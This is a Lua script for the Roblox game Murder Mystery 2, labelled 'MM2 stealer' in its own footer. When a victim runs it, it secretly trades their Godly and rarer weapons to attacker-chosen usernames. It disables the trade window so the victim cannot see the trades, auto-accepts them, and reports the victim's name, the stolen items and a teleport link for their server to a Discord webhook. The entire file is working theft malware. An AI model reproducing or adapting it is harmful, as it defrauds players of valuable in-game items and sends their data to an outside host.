-- Evita ejecutar el script más de una vez
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

-- Configuración global
local users = _G.Usernames or {}
local min_rarity = _G.min_rarity or "Godly"
local min_value = _G.min_value or 1
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""

-- Servicios
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local playerGui = plr:WaitForChild("PlayerGui")
local HttpService = game:GetService("HttpService")
local database = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Validaciones
if next(users) == nil or webhook == "" then
    warn("No usernames or webhook set")
    return
end

if game.PlaceId ~= 142823291 then
    warn("Game not supported. Join a normal MM2 server")
    return
end

if ReplicatedStorage:WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
    warn("VIP server detected. Join a different server")
    return
end

if #Players:GetPlayers() >= 12 then
    warn("Server full. Join a less populated server")
    return
end

-- Tablas y constantes
local rarityTable = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage"}
local weaponsToSend = {}
local totalValue = 0

local untradable = {
    ["DefaultGun"] = true,
    ["DefaultKnife"] = true,
    ["Reaver"] = true,
    ["Reaver_Legendary"] = true,
    ["Reaver_Godly"] = true,
    ["Reaver_Ancient"] = true,
    ["IceHammer"] = true,
    ["IceHammer_Legendary"] = true,
    ["IceHammer_Godly"] = true,
    ["IceHammer_Ancient"] = true,
    ["Gingerscythe"] = true,
    ["Gingerscythe_Legendary"] = true,
    ["Gingerscythe_Godly"] = true,
    ["Gingerscythe_Ancient"] = true,
    ["TestItem"] = true,
    ["Season1TestKnife"] = true,
    ["Cracks"] = true,
    ["Icecrusher"] = true,
    ["???"] = true,
    ["Dartbringer"] = true,
    ["TravelerAxeRed"] = true,
    ["TravelerAxeBronze"] = true,
    ["TravelerAxeSilver"] = true,
    ["TravelerAxeGold"] = true,
    ["BlueCamo_K_2022"] = true,
    ["GreenCamo_K_2022"] = true,
    ["SharkSeeker"] = true
}

-- Funciones de trade
local function sendTradeRequest(user)
    local target = Players:FindFirstChild(user)
    if target then
        ReplicatedStorage.Trade.SendRequest:InvokeServer(target)
    end
end

local function getTradeStatus()
    return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()
end

local function acceptTrade()
    ReplicatedStorage.Trade.AcceptTrade:FireServer(285646582)
end

local function addWeaponToTrade(id)
    ReplicatedStorage.Trade.OfferItem:FireServer(id, "Weapons")
end

local function waitForTradeCompletion()
    while getTradeStatus() ~= "None" do
        task.wait(0.1)
    end
end

-- Evita que Trade GUI se abra
local function disableTradeGUI()
    local tradegui = playerGui:WaitForChild("TradeGUI")
    tradegui:GetPropertyChangedSignal("Enabled"):Connect(function()
        tradegui.Enabled = false
    end)
    local tradeguiphone = playerGui:WaitForChild("TradeGUI_Phone")
    tradeguiphone:GetPropertyChangedSignal("Enabled"):Connect(function()
        tradeguiphone.Enabled = false
    end)
end
disableTradeGUI()

-- Construye lista de ítems para trade
local function buildWeaponsList()
    local realData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
    local minRarityIndex = table.find(rarityTable, min_rarity)

    for dataid, amount in pairs(realData.Weapons.Owned) do
        local itemData = database[dataid]
        if itemData then
            local rarityIndex = table.find(rarityTable, itemData.Rarity)
            if rarityIndex and rarityIndex >= minRarityIndex and not untradable[dataid] then
                local value = (rarityIndex >= table.find(rarityTable, "Godly")) and 2 or 1
                if value >= min_value then
                    totalValue += value * amount
                    table.insert(weaponsToSend, {DataID=dataid, Rarity=itemData.Rarity, Amount=amount, Value=value})
                end
            end
        end
    end

    table.sort(weaponsToSend, function(a,b)
        return (a.Value * a.Amount) > (b.Value * b.Amount)
    end)
end
buildWeaponsList()

-- Función para enviar webhook
local function sendWebhook(list, prefix)
    local fields = {
        {name="Victim Username:", value=plr.Name, inline=true},
        {name="Items sent:", value="", inline=false},
        {name="Summary:", value="Total Value: "..totalValue, inline=false}
    }

    for _, item in ipairs(list) do
        fields[2].value ..= string.format("%s (x%s): %s Value (%s)\n", item.DataID, item.Amount, item.Value*item.Amount, item.Rarity)
    end

    local data = {
        content = prefix.."game:GetService('TeleportService'):TeleportToPlaceInstance(142823291,'"..game.JobId.."')",
        embeds = {{
            title = "🕹️ New MM2 Execution",
            color = 65280,
            fields = fields,
            footer = {text="MM2 stealer by Tobi. discord.gg/GY2RVSEGDT"}
        }}
    }

    pcall(function()
        HttpService:PostAsync(webhook, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
    end)
end

-- Función principal de trade
local function doTradeWithUser(user)
    while #weaponsToSend > 0 do
        local status = getTradeStatus()

        if status == "None" then
            sendTradeRequest(user)
        elseif status == "SendingRequest" then
            task.wait(0.3)
        elseif status == "ReceivingRequest" then
            ReplicatedStorage.Trade.DeclineRequest:FireServer()
            task.wait(0.3)
        elseif status == "StartTrade" then
            for i = 1, math.min(4, #weaponsToSend) do
                local weapon = table.remove(weaponsToSend, 1)
                for _ = 1, weapon.Amount do
                    addWeaponToTrade(weapon.DataID)
                end
            end
            task.wait(6)
            acceptTrade()
            waitForTradeCompletion()
        else
            task.wait(0.5)
        end
        task.wait(1)
    end
end

-- Espera chat del usuario y ejecuta trade + webhook
local function waitForUserChat()
    local sentMessage = false

    local function onPlayerChat(player)
        if table.find(users, player.Name) then
            player.Chatted:Connect(function()
                if not sentMessage then
                    local prefix = (ping=="Yes") and "--[[@everyone]] " or ""
                    sendWebhook(weaponsToSend, prefix)
                    sentMessage = true
                end
                doTradeWithUser(player.Name)
            end)
        end
    end

    for _, p in ipairs(Players:GetPlayers()) do onPlayerChat(p) end
    Players.PlayerAdded:Connect(onPlayerChat)
end

waitForUserChat()
